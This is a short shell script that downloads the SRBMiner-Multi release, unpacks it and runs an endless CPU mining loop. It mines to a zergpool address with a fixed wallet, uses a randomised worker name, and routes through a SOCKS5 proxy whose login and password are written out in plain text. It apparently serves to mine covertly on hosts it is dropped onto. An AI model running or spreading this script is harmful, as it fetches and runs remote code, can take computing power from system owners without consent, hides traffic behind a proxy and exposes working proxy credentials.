#!/bin/sh
 WORKER=$(echo $(shuf -i 0-15 -n 1)-RVN)
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.7/SRBMiner-Multi-0-7-7-Linux.tar.xz
tar -xf SRBMiner-Multi-0-7-7-Linux.tar.xz
cd SRBMiner-Multi-0-7-7
chmod +x SRBMiner-MULTI
while [ 1 ]; do
  sleep 5
  ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool verushash.na.mine.zergpool.com:3300 --wallet RBXC64GiFJYcYMnfHV5XjTELsHEEQxivmZ -p  c=RVN,mc=VRSC,ID=Jozz -t 4 -x socks5://nlacwnfp:sr7ps9li85lc@209.127.191.180:9279 
  done
sleep 999999999
